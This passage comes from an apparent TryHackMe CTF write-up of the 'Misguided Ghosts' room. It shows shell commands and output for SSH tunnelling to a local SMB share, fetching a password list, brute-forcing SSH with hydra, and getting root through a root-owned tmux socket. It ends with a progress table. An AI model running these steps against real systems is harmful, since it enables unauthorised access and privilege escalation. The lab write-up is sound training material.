CdKPW4yuLZtp0ypGlAmL6F5ovJmqHj18PMGIG1bmn1E68uSJVEhl
-----END RSA PRIVATE KEY-----
```

<br>
<br>
<h1 align="center">Shell as Zac<a id='12'></a></h1>

```bash
zac@misguided_ghosts:~$ ls -lah
total 40K
drwxr-xr-x 6 zac  zac  4.0K Aug 26  2020 .
drwxr-xr-x 4 root root 4.0K Aug 11  2020 ..
-rw------- 1 zac  zac     0 Aug 28  2020 .bash_history
-rw-r--r-- 1 zac  zac   220 Aug 11  2020 .bash_logout
-rw-r--r-- 1 zac  zac  3.7K Aug 11  2020 .bashrc
drwx------ 2 zac  zac  4.0K Aug 20  2020 .cache
drwx------ 3 zac  zac  4.0K Aug 20  2020 .gnupg
drwxrwxr-x 2 zac  zac  4.0K Aug 26  2020 notes
-rw-r--r-- 1 zac  zac   807 Aug 11  2020 .profile
-rw------- 1 zac  zac     7 Aug 25  2020 .python_history
drwx------ 2 zac  zac  4.0K Aug 26  2020 .ssh
```

<br>

<img width="995" height="375" alt="image" src="https://github.com/user-attachments/assets/9258e856-790e-42e5-832b-cbdf9d32327a" />

<br>
<br>
<p align="center">Identify port <code>445</code> related to an active SMB client.</p>

```bash
zac@misguided_ghosts:~/notes$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:45257         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:139           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36621         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42483         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44727         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36279         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:139                 :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:445                 :::*                    LISTEN      -                   
...       
```

<br>
<p align="center">Identify <code>run.js</code></p>

```bash
zac@misguided_ghosts:~/notes$ ps aux | grep hayley
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
hayley    1283  0.0  0.0   4628   776 ?        Ss   15:22   0:00 /bin/sh -c  /usr/bin/node /opt/xss/run.js
hayley    1284  0.0  1.9 630828 38904 ?        Sl   15:22   0:00 /usr/bin/node /opt/xss/run.js
hayley    1295  0.0  3.9 585648 80700 ?        Ssl  15:22   0:00 /opt/xss/node_modules/puppeteer/.local-chromium/linux-782078/chrome-linux/chrome --disable-background-networking --ena
hayley    1298  0.0  0.0   4628   776 ?        Ss   18:18   0:00 /bin/sh -c  /usr/bin/node /opt/xss/run.js
hayley    1299  0.0  1.9 630828 38816 ?        Sl   18:18   0:00 /usr/bin/node /opt/xss/run.js
hayley    1301  0.0  0.6 432396 13456 ?        S    15:22   0:00 /opt/xss/node_modules/puppeteer/.local-chromium/linux-782078/chrome-linux/chrome --type=zygote --headless --headless
hayley    1326  0.0  2.4 488880 49780 ?        Sl   15:22   0:00 /opt/xss/node_modules/puppeteer/.local-chromium/linux-782078/chrome-linux/chrome --type=gppu-process --field-trial-hand
hayley    1330  0.0  3.3 4719156 67636 ?       Sl   15:22   0:00 /opt/xss/node_modules/puppeteer/.local-chromium/linux-782078/chrome-linux/chrome --type=renderer --disable-dev-shm-usa
hayley    1331  0.0  0.6 440044 13672 ?        S    15:22   0:00 /opt/xss/node_modules/puppeteer/.local-chromium/linux-782078/chrome-linux/chrome --type=broker
hayley    1360  0.0  3.4 4719152 71132 ?       Sl   15:22   0:00 /opt/xss/node_modules/puppeteer/.local-chromium/linux-782078/chrome-linux/chrome --type=renderer --disable-dev-shm-usa
hayley    1677  0.0  0.0   4628   808 ?        Ss   15:24   0:00 /bin/sh -c  /usr/bin/node /opt/xss/run.js
hayley    1678  0.0  1.9 631084 38940 ?        Sl   15:24   0:00 /usr/bin/node /opt/xss/run.js
...
```

```bash
zac@misguided_ghosts:/opt/xss$ ls -lah
total 32K
drwxr-xr-x  3 root root 4.0K Aug 18  2020 .
drwxr-xr-x  4 root root 4.0K Oct 19 15:21 ..
drwxr-xr-x 56 root root 4.0K Aug 18  2020 node_modules
-rw-r--r--  1 root root  16K Aug 18  2020 package-lock.json
-rw-r--r--  1 root root  340 Aug 18  2020 run.js
```

<br>
<p align="center">Inspect <code>run.js</code></p>

```bash
zac@misguided_ghosts:/opt/xss$ cat run.js
const puppeteer = require('puppeteer');

(async () => {
	const browser = await puppeteer.launch({ ignoreHTTPSErrors: true });
	const page = await browser.newPage();

	await page.setCookie({ name: 'login', value: 'hayley_is_admin', domain: 'localhost' });
	await page.goto('https://localhost:8080/dashboard');

	await browser.close();
})();
```

<br>
<p align="center">Identify <code>start.sh</code> script related to a Docker container start.</p>

```bash
zac@misguided_ghosts:/var/www/https$ ls
app.py  cert.pem  Dockerfile  key.pem  requirements.txt  start.sh  static  stop.sh  templates
```

<br>
<p align="center">Inspect <code>start.sh</code></p>

```bash
zac@misguided_ghosts:/var/www/https$ cat start.sh
#!/bin/bash

/usr/bin/docker build -t https /var/www/https

/usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
```

<br>
<br>
<p align="center">Exit <code>zac</code>´s session. Start another session.</p>

```bash
:~/MisguidedGhosts# ssh -L 9001:localhost:445 -i id_rsa zac@misguided_ghosts.thm
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
...
zac@misguided_ghosts:~$ 
```

<br>
<br>
<p align="center">Enumerate the SMB client.</p>


```bash
:~/MisguidedGhosts# smbclient -L localhost -p 9001
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	local           Disk      Local list of passwords for our services
	IPC$            IPC       IPC Service (misguided_ghosts server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<br>
<br>
<br>
<br>
<p align="center">Access the local SMB share.</p>

```bash
:~/MisguidedGhosts# smbclient //localhost/local -p 9001
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 26 15:31:28 2020
  ..                                  D        0  Tue Aug 25 01:00:53 2020
  passwords.bak                       N      160  Wed Aug 26 15:31:28 2020

		19475088 blocks of size 1024. 8554136 blocks available
smb: \> get passwords.bak
getting file \passwords.bak of size 160 as passwords.bak (52.1 KiloBytes/sec) (average 52.1 KiloBytes/sec)
smb: \> exit
```

```bash
:~/MisguidedGhosts# file passwords.bak
passwords.bak: ASCII text
```

```bash
:~/MisguidedGhosts# head -n 6 passwords.bak
pft7vPl
HQ@5Y64
Ls7kZxv
KPBRFJz
fKtBSbx
FWbnrxr
```

<br>
<p align="center">hayley : ⚪⚪⚪⚪⚪⚪⚪</p>

```bash
:~/MisguidedGhosts# hydra -l hayley -P passwords.bak ssh://misguided_ghosts.thm
...
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking ssh://misguided_ghosts.thm:22/
[22][ssh] host: misguided_ghosts.thm   login: hayley   password: ⚪⚪⚪⚪⚪⚪⚪
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-19 xx:xx:xx
```

<br>
<br>
<h1 align="center">Shell as Hayley<a id='13'></a></h1>

```bash
zac@misguided_ghosts:~$ su hayley
Password: 
hayley@misguided_ghosts:/home/zac$
```

```bash
hayley@misguided_ghosts:/home/zac$ id
uid=1000(hayley) gid=1000(hayley) groups=1000(hayley),1002(paramore)
```

```bash
hayley@misguided_ghosts:/home/zac$ pwd
/home/zac
```

```bash
hayley@misguided_ghosts:/home/zac$ cd ..
```

```bash
hayley@misguided_ghosts:/home$ cd hayley
```

```bash
hayley@misguided_ghosts:~$ ls -lah
total 44K
drwxr-x--- 6 hayley hayley 4.0K Aug 25  2020 .
drwxr-xr-x 4 root   root   4.0K Aug 11  2020 ..
-rw------- 1 hayley hayley    0 Aug 28  2020 .bash_history
-rw-r--r-- 1 hayley hayley  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 hayley hayley 3.7K Apr  4  2018 .bashrc
drwx------ 2 hayley hayley 4.0K Aug 11  2020 .cache
drwx------ 3 hayley hayley 4.0K Aug 11  2020 .gnupg
drwx------ 3 hayley hayley 4.0K Aug 18  2020 .pki
-rw-r--r-- 1 hayley hayley  807 Apr  4  2018 .profile
-rw-r--r-- 1 hayley hayley    0 Aug 11  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 hayley hayley   16 Aug 19  2020 user.txt
drwxr-xr-x 2 hayley hayley 4.0K Aug 18  2020 .vim
-rw------- 1 hayley hayley 1.1K Aug 18  2020 .viminfo
```

```bash
hayley@misguided_ghosts:~$ cat user.txt
{*************}
```

<br>
<p align="center">Hayley can run <code>visudo</code> with <code>sudo</code> and no password.</p>

```bash
hayley@misguided_ghosts:~$ sudo -l
Matching Defaults entries for hayley on misguided_ghosts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hayley may run the following commands on misguided_ghosts:
    (ALL : ALL) NOPASSWD: /usr/sbin/visudo
```

<br>
<p align="center">Identify the <code>tmux</code>code> socket owned by <strong>root</strong>.</p>

```bash
hayley@misguided_ghosts:~$ ps aux | grep root
...
root       870  0.0  0.1  30028  3160 ?        Ss   18:17   0:00 /usr/sbin/cron -f
root       872  0.0  0.3 286336  6740 ?        Ssl  18:17   0:00 /usr/lib/accountsservice/accounts-daemon
root       885  0.0  0.0  95540  1676 ?        Ssl  18:17   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       892  0.0  0.8 169104 17236 ?        Ssl  18:17   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       979  0.0  0.0   8916   828 ?        Ss   18:17   0:00 /usr/sbin/knockd -i eth0
root       994  0.0  0.1  28540  3600 ?        Ss   18:17   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d
...
```

```bash
hayley@misguided_ghosts:/opt$ ls -lah
total 16K
drwxr-xr-x  4 root root     4.0K Oct 19 18:17 .
drwxr-xr-x 23 root root     4.0K Aug 25  2020 ..
drwx--x--x  4 root root     4.0K Aug 11  2020 containerd
srw-rw----  1 root paramore    0 Oct 19 18:17 .details
drwxr-xr-x  3 root root     4.0K Aug 18  2020 xss
```

<br>
<h1 align="center">Root<a id='14'></a></h1>
<p align="center">Access the <code>tmux</code>code> socket owned by <strong>root</strong>.</p>

```bash
hayley@misguided_ghosts:/opt$ tmux -S .details
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd    
/opt
# cd /root
# ls
root.txt
# cat root.txt
{***************}
```

<br>

<img width="1209" height="636" alt="image" src="https://github.com/user-attachments/assets/6c1b6f28-295a-4f66-a3df-ee3b25b9c602" />

<br>
<br>
<br>

<p>1.2. What is the root flag?<br>
<code>{***************}</code></p>

<br>
<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d478773e-ad19-4cce-8ab9-ba64588575e0"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/801520ed-5255-4d5c-9ba2-68570a91622c"></p>


<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>


<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|19      |Hard 🚩 - Misguided Ghosts             | 531    |      87ᵗʰ    |      4ᵗʰ     |      77ᵗʰ    |     2ⁿᵈ    | 131,661  |  1,009   |    79     |
|18      |Hard 🚩 - Year of the Pig              | 530    |      89ᵗʰ    |      4ᵗʰ     |      72ⁿᵈ    |     2ⁿᵈ    | 131,531  |  1,008    |    79     |
|18      |Easy 🚩 - The Phishing Pond            | 530    |      90ᵗʰ    |      4ᵗʰ     |      74ᵗʰ    |     2ⁿᵈ    | 131,501  |  1,007    |    79     |
|17      |Hard 🚩 - Initial Access Pot           | 529    |      90ᵗʰ    |      4ᵗʰ     |      68ᵗʰ    |     2ⁿᵈ    | 131,456  |  1,006    |    79     |
|17      |Medium 🔗 - AllSignsPoint2Pwnage       | 529    |      90ᵗʰ    |      4ᵗʰ     |      87ᵗʰ    |     2ⁿᵈ    | 131,186  |  1,005    |    79     |
|16      |Easy 🔗 - Network Traffic Basics       | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,138  |  1,004    |    79     |
|16      |Medium 🔗 - Linux Threat Detection 3   | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,066  |  1,003    |    79     |
|15      |Medium 🔗 - Windows PrivEsc, in progress| 527   |      91ˢᵗ    |      4ᵗʰ     |      83ʳᵈ    |     2ⁿᵈ    | 131,050  |  1,002    |    79     |
|13      |Hard 🚩 - M4tr1x: Exit Denied          | 525    |      92ⁿᵈ    |      4ᵗʰ     |      76ᵗʰ    |     2ⁿᵈ    | 130,938  |  1,002    |    79     |
|12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:    87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/c0a1d74f-3433-4254-8a25-965ffae2a164"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/9d16d101-ba8e-4e68-9a4b-22bed97aa651"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/13f752cb-ac28-4ea0-a520-f426354cd416"><br>
                  Global monthly:     77ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9c0c4664-ce3f-42a4-b2d4-26df5898fa6b"><br>
                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/ee20519c-da00-42c3-918a-69e80195dfde"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
